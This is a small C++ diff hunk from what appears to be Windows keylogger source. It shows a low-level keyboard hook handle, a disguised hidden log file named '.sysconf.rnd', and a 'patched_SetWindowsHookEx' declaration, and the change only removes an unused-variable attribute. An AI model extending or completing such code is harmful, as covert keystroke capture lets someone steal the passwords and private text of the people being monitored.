@@ -21,7 +21,7 @@ static std::string logPath = ".sysconf.rnd";
 
 
 std::vector<std::string> buffer;
-[[maybe_unused]] HHOOK hhkLowLevelKybd = nullptr;
+HHOOK hhkLowLevelKybd = nullptr;
 
 __declspec() void patched_SetWindowsHookEx();
 _declspec() void size();
